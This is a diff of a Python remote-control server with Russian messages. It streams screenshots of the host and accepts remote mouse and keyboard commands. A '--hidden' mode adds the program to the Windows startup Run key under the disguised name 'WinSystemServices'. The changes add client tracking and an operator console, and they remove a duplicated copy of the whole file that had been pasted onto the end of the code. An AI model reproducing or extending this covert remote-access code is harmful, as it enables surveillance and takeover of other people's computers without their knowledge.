@@ -35,6 +35,8 @@ def auto_run():
 
 
 def handle_client(client_socket, addr):
+    with clients_lock:
+        connected_clients.append((addr[0], time.strftime('%H:%M:%S')))
     try:
         client_socket.sendall(f"INFO:{get_system_info()}".encode('utf-8'))
     except:
@@ -122,6 +124,11 @@ def handle_client(client_socket, addr):
         client_socket.close()
     except:
         pass
+    with clients_lock:
+        for i, (ip, _) in enumerate(connected_clients):
+            if ip == addr[0]:
+                connected_clients.pop(i)
+                break
 
 
 def send_screenshots(client_socket):
@@ -157,198 +164,6 @@ def send_screenshots(client_socket):
 def client_handler(client_socket, addr):
     try:
         if ALLOWED_IPS and addr[0] not in ALLOWED_IPS:
-            try:
-                client_socket.sendall(f"BLOCKED:IP not allowed".encode('utf-8'))
-            except:
-                pass
-            try:
-                client_socket.close()
-            except:
-                pass
-            return
-        
-        try:
-            client_socket.sendall(b"CONNECTED")
-        except:
-            return
-        
-        handler_thread = threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True)
-        handler_thread.start()
-        
-        send_screenshots(client_socket)
-        
-    except Exception as e:
-        print(f"Ошибка клиента: {e}")
-    finally:
-        try:
-            client_socket.close()
-        except:
-            pass
-
-
-def main():
-    if len(sys.argv) > 1 and sys.argv[1] == "--hidden":
-        auto_run()
-    
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    
-    try:
-        server.bind(("0.0.0.0", SERVER_PORT))
-        server.listen(5)
-        print(f"Сервер запущен на порту {SERVER_PORT}")
-    except Exception as e:
-        print(f"Не удалось запустить: {e}")
-        return
-    
-    while True:
-        try:
-            client_socket, addr = server.accept()
-            print(f"Подключение от {addr[0]}")
-            
-            thread = threading.Thread(target=client_handler, args=(client_socket, addr), daemon=True)
-            thread.start()
-            
-        except KeyboardInterrupt:
-            print("Сервер остановлен")
-            break
-        except Exception as e:
-            print(f"Ошибка: {e}")
-            continue
-    
-    server.close()
-
-
-if __name__ == "__main__":
-    main()import socket
-import threading
-import pyautogui
-import zlib
-import os
-import sys
-import time
-import base64
-from io import BytesIO
-from PIL import Image
-
-
-SERVER_PORT = 5555
-ALLOWED_IPS = []
-SCREENSHOT_QUALITY = 50
-SCREENSHOT_INTERVAL = 3
-
-
-def get_system_info():
-    import platform
-    import socket as sock
-    pc_name = sock.gethostname()
-    os_version = platform.platform()
-    return f"{pc_name}|{os_version}"
-
-
-def auto_run():
-    try:
-        import winreg
-        exe_path = os.path.abspath(sys.executable)
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "WinSystemServices", 0, winreg.REG_SZ, exe_path)
-        winreg.CloseKey(key)
-    except:
-        pass
-
-
-def handle_client(client_socket, addr):
-    try:
-        client_socket.sendall(f"INFO:{get_system_info()}".encode('utf-8'))
-    except:
-        pass
-    
-    while True:
-        try:
-            data = client_socket.recv(4096)
-            if not data:
-                break
-            
-            message = data.decode('utf-8', errors='ignore')
-            
-            if message.startswith("MOUSE:"):
-                parts = message[6:].split(",")
-                if len(parts) >= 3:
-                    action = parts[0]
-                    x, y = int(parts[1]), int(parts[2])
-                    
-                    if action == "LEFT_DOWN":
-                        pyautogui.mouseDown(x, y, button='left')
-                    elif action == "LEFT_UP":
-                        pyautogui.mouseUp(x, y, button='left')
-                    elif action == "RIGHT_DOWN":
-                        pyautogui.mouseDown(x, y, button='right')
-                    elif action == "RIGHT_UP":
-                        pyautogui.mouseUp(x, y, button='right')
-                    elif action == "MOVE":
-                        pyautogui.moveTo(x, y)
-                    elif action == "CLICK":
-                        pyautogui.click(x, y, button='left')
-                    elif action == "RIGHT_CLICK":
-                        pyautogui.click(x, y, button='right')
-            
-            elif message.startswith("KEY:"):
-                key_data = message[4:]
-                if key_data == "ENTER":
-                    pyautogui.press('enter')
-                elif key_data == "TAB":
-                    pyautogui.press('tab')
-                elif key_data == "ESC":
-                    pyautogui.press('esc')
-                elif key_data == "BACKSPACE":
-                    pyautogui.press('backspace')
-                elif key_data == "SPACE":
-                    pyautogui.press('space')
-                elif key_data.startswith("TEXT:"):
-                    text = key_data[5:]
-                    pyautogui.write(text)
-                else:
-                    pyautogui.press(key_data.lower())
-            
-            elif message == "PING":
-                client_socket.sendall(b"PONG")
-                
-        except Exception as e:
-            print(f"Ошибка: {e}")
-            break
-    
-    try:
-        client_socket.close()
-    except:
-        pass
-
-
-def send_screenshots(client_socket):
-    while True:
-        try:
-            screenshot = pyautogui.screenshot()
-            
-            buffer = BytesIO()
-            screenshot.save(buffer, format='JPEG', quality=SCREENSHOT_QUALITY)
-            image_data = buffer.getvalue()
-            
-            compressed = zlib.compress(image_data, level=6)
-            
-            size = len(compressed)
-            client_socket.sendall(size.to_bytes(4, byteorder='big'))
-            
-            client_socket.sendall(compressed)
-            
-        except Exception as e:
-            print(f"Ошибка скриншота: {e}")
-            break
-        
-        time.sleep(SCREENSHOT_INTERVAL)
-
-
-def client_handler(client_socket, addr):
-    try:
-        if ALLOWED_IPS and addr[0] not in ALLOWED_IPS:
             client_socket.sendall(f"BLOCKED:IP not allowed".encode('utf-8'))
             client_socket.close()
             return
@@ -369,17 +184,32 @@ def client_handler(client_socket, addr):
             pass
 
 
+def print_clients():
+    with clients_lock:
+        if not connected_clients:
+            print("Нет подключённых клиентов.")
+        else:
+            print("Подключённые клиенты:")
+            for ip, t in connected_clients:
+                print(f"  {ip} (подключён в {t})")
+
+
 def main():
     if len(sys.argv) > 1 and sys.argv[1] == "--hidden":
         auto_run()
     
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind(("0.0.0.0", SERVER_PORT))
-    server.listen(5)
     
-    print(f"Сервер запущен на порту {SERVER_PORT}")
+    try:
+        server.bind(("0.0.0.0", SERVER_PORT))
+        server.listen(5)
+        print(f"Сервер запущен на порту {SERVER_PORT}")
+    except Exception as e:
+        print(f"Не удалось запустить: {e}")
+        return
     
+    threading.Thread(target=console_commands, daemon=True).start()
     while True:
         try:
             client_socket, addr = server.accept()
@@ -389,11 +219,25 @@ def main():
             thread.start()
             
         except KeyboardInterrupt:
+            print("Сервер остановлен")
             break
         except Exception as e:
             print(f"Ошибка: {e}")
+            continue
     
     server.close()
+
+
+def console_commands():
+    while True:
+        cmd = input().strip().lower()
+        if cmd == "clients" or cmd == "list":
+            print_clients()
+        elif cmd == "exit":
+            print("Выход из консоли...")
+            os._exit(0)
+        else:
+            print("Доступные команды: clients (list), exit")
 
 
 if __name__ == "__main__":
